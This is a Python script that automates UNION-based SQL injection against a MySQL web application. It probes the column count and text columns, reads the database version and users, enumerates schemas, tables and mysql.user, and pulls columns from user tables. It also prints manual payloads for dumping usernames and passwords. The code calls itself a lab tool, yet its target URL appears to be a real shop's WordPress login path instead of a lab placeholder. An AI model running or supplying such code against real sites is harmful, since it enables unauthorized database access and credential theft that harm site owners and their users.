import requests
import re
from urllib.parse import quote

# Lab URL - Update this with your actual lab URL
LAB_URL = "https://dipelectronicslabshop.in/wp-login.php"

def test_columns():
    """Determine number of columns and which contain text"""
    print("=" * 70)
    print("STEP 1: Finding number of columns")
    print("=" * 70)
    
    base_url = f"{LAB_URL}/filter"
    
    # Test different column counts
    for num_cols in range(1, 10):
        # Build UNION SELECT with NULL values
        nulls = ','.join(['NULL'] * num_cols)
        
        # MySQL doesn't require FROM dual
        payloads = [
            f"' UNION SELECT {nulls}-- ",
            f"' UNION SELECT {nulls}#",
            f"' UNION SELECT {nulls}-- -",
            f"' UNION SELECT {nulls}/*comment*/"
        ]
        
        for payload in payloads:
            params = {'category': payload}
            response = requests.get(base_url, params=params)
            
            print(f"\n[*] Testing {num_cols} columns: {payload}")
            
            if response.status_code == 200 and "Internal Server Error" not in response.text:
                print(f"[+] Found valid column count: {num_cols}")
                return num_cols, payload.split('UNION')[1].split(nulls)[1]  # Return comment style
    
    return None, None

def find_text_columns(num_cols, comment_style):
    """Find which columns can hold text data"""
    print("\n" + "=" * 70)
    print("STEP 2: Finding text columns")
    print("=" * 70)
    
    base_url = f"{LAB_URL}/filter"
    text_columns = []
    
    for col in range(num_cols):
        # Build payload with 'test' in current column, NULL in others
        values = ['NULL'] * num_cols
        values[col] = "'test'"
        payload = f"' UNION SELECT {','.join(values)}{comment_style}"
        
        params = {'category': payload}
        response = requests.get(base_url, params=params)
        
        print(f"\n[*] Testing column {col + 1}: {payload}")
        
        if response.status_code == 200 and "test" in response.text:
            print(f"[+] Column {col + 1} can hold text")
            text_columns.append(col + 1)
    
    return text_columns

def get_mysql_version(num_cols, text_column, comment_style):
    """Retrieve MySQL database version"""
    print("\n" + "=" * 70)
    print("STEP 3: Getting MySQL version")
    print("=" * 70)
    
    base_url = f"{LAB_URL}/filter"
    
    # MySQL version functions
    version_functions = [
        '@@version',
        'VERSION()',
        'DATABASE()',
        'USER()',
        'CURRENT_USER()',
        '@@hostname'
    ]
    
    results = {}
    
    for func in version_functions:
        # Build payload to get version
        values = ['NULL'] * num_cols
        values[text_column - 1] = func
        
        payload = f"' UNION SELECT {','.join(values)}{comment_style}"
        
        print(f"\n[*] Testing: {func}")
        print(f"    Payload: {payload}")
        
        params = {'category': payload}
        response = requests.get(base_url, params=params)
        
        if response.status_code == 200:
            # Extract version info from response
            # Remove HTML tags and find the result
            clean_text = re.sub(r'<[^>]+>', '\n', response.text)
            lines = clean_text.split('\n')
            
            for line in lines:
                line = line.strip()
                # Look for version patterns
                if re.match(r'^\d+\.\d+', line) or 'mysql' in line.lower() or '@' in line:
                    results[func] = line
                    print(f"    [+] Result: {line}")
                    break
    
    return results

def get_database_info(num_cols, text_columns, comment_style):
    """Get additional database information"""
    print("\n" + "=" * 70)
    print("STEP 4: Getting database information")
    print("=" * 70)
    
    base_url = f"{LAB_URL}/filter"
    
    # If we have 2 text columns, we can get more info
    if len(text_columns) >= 2:
        col1 = text_columns[0] - 1
        col2 = text_columns[1] - 1
        
        queries = [
            ("Databases", "schema_name", "NULL", "information_schema.schemata"),
            ("Tables", "table_name", "table_schema", "information_schema.tables"),
            ("Current DB Tables", "table_name", "NULL", "information_schema.tables WHERE table_schema=DATABASE()"),
            ("Users", "user", "host", "mysql.user")
        ]
        
        for query_name, field1, field2, table in queries:
            values = ['NULL'] * num_cols
            values[col1] = field1
            values[col2] = field2 if field2 != "NULL" else "NULL"
            
            payload = f"' UNION SELECT {','.join(values)} FROM {table}{comment_style}"
            
            print(f"\n[*] Getting {query_name}:")
            print(f"    Payload: {payload}")
            
            params = {'category': payload}
            response = requests.get(base_url, params=params)
            
            if response.status_code == 200 and "error" not in response.text.lower():
                # Extract results
                clean_text = re.sub(r'<[^>]+>', '\n', response.text)
                lines = [line.strip() for line in clean_text.split('\n') if line.strip()]
                
                # Show first few results
                count = 0
                for line in lines:
                    if line and not any(skip in line.lower() for skip in ['select', 'from', 'union']):
                        print(f"    - {line}")
                        count += 1
                        if count > 10:
                            print("    ... (truncated)")
                            break

def extract_table_data(table_name, num_cols, text_columns, comment_style):
    """Extract data from a specific table"""
    print(f"\n" + "=" * 70)
    print(f"EXTRACTING DATA FROM TABLE: {table_name}")
    print("=" * 70)
    
    base_url = f"{LAB_URL}/filter"
    
    # First, get column names
    if len(text_columns) >= 2:
        col1 = text_columns[0] - 1
        col2 = text_columns[1] - 1
        
        values = ['NULL'] * num_cols
        values[col1] = 'column_name'
        values[col2] = 'data_type'
        
        payload = f"' UNION SELECT {','.join(values)} FROM information_schema.columns WHERE table_name='{table_name}'{comment_style}"
        
        print("[*] Getting column names...")
        params = {'category': payload}
        response = requests.get(base_url, params=params)
        
        if response.status_code == 200:
            clean_text = re.sub(r'<[^>]+>', '\n', response.text)
            print("[+] Columns found:")
            lines = [line.strip() for line in clean_text.split('\n') if line.strip()]
            for line in lines:
                if line and not any(skip in line.lower() for skip in ['select', 'from', 'union', 'null']):
                    print(f"    - {line}")

def mysql_injection_full():
    """Complete MySQL injection automation"""
    print("MySQL SQL INJECTION - COMPLETE ENUMERATION")
    print("=" * 70)
    
    # Step 1: Find number of columns
    num_cols, comment_style = test_columns()
    
    if not num_cols:
        print("[-] Could not determine column count")
        return
    
    print(f"\n[+] Using comment style: {comment_style}")
    
    # Step 2: Find text columns
    text_columns = find_text_columns(num_cols, comment_style)
    
    if not text_columns:
        print("[-] No text columns found")
        return
    
    print(f"\n[+] Summary: {num_cols} columns, text in columns: {text_columns}")
    
    # Step 3: Get version
    version_info = get_mysql_version(num_cols, text_columns[0], comment_style)
    
    if version_info:
        print("\n" + "=" * 70)
        print("VERSION INFORMATION:")
        print("=" * 70)
        for func, result in version_info.items():
            print(f"{func}: {result}")
    
    # Step 4: Get database info
    get_database_info(num_cols, text_columns, comment_style)
    
    # Step 5: Look for interesting tables
    print("\n[*] Looking for user/admin tables...")
    if len(text_columns) >= 1:
        col = text_columns[0] - 1
        values = ['NULL'] * num_cols
        values[col] = 'table_name'
        
        # Look for tables with 'user' in the name
        payload = f"' UNION SELECT {','.join(values)} FROM information_schema.tables WHERE table_name LIKE '%user%'{comment_style}"
        
        params = {'category': payload}
        base_url = f"{LAB_URL}/filter"
        response = requests.get(base_url, params=params)
        
        if response.status_code == 200:
            clean_text = re.sub(r'<[^>]+>', '\n', response.text)
            lines = [line.strip() for line in clean_text.split('\n') if line.strip()]
            
            user_tables = []
            for line in lines:
                if 'user' in line.lower() and not any(skip in line.lower() for skip in ['select', 'from', 'union']):
                    user_tables.append(line)
                    print(f"    Found: {line}")
            
            # Extract data from first user table found
            if user_tables and len(text_columns) >= 2:
                table = user_tables[0]
                extract_table_data(table, num_cols, text_columns, comment_style)

def manual_payloads():
    """Provide manual MySQL payload examples"""
    print("\n" + "=" * 70)
    print("MANUAL MySQL PAYLOAD EXAMPLES")
    print("=" * 70)
    
    print("\n[1] Test number of columns:")
    print("    ' UNION SELECT NULL-- ")
    print("    ' UNION SELECT NULL,NULL-- ")
    print("    ' UNION SELECT NULL,NULL,NULL-- ")
    print("    ' UNION SELECT NULL#")
    
    print("\n[2] Test for text columns (assuming 2 columns):")
    print("    ' UNION SELECT 'abc','def'-- ")
    print("    ' UNION SELECT 'abc','def'#")
    
    print("\n[3] Get MySQL version:")
    print("    ' UNION SELECT @@version,NULL-- ")
    print("    ' UNION SELECT VERSION(),DATABASE()-- ")
    
    print("\n[4] List all databases:")
    print("    ' UNION SELECT schema_name,NULL FROM information_schema.schemata-- ")
    
    print("\n[5] List tables in current database:")
    print("    ' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=DATABASE()-- ")
    
    print("\n[6] Get columns from a table:")
    print("    ' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'-- ")
    
    print("\n[7] Extract data from users table:")
    print("    ' UNION SELECT username,password FROM users-- ")
    
    print("\n[8] Concatenate multiple columns:")
    print("    ' UNION SELECT CONCAT(username,':',password),NULL FROM users-- ")

def main():
    print("Choose an option:")
    print("1. Run automated MySQL injection")
    print("2. Show manual payload examples")
    
    choice = input("\nEnter choice (1 or 2): ").strip()
    
    if choice == "1":
        # Make sure to update LAB_URL before running
        if "YOUR-LAB-ID" in LAB_URL:
            print("\n[!] Please update LAB_URL with your actual lab URL first!")
            return
        mysql_injection_full()
    else:
        manual_payloads()

if __name__ == "__main__":
    main()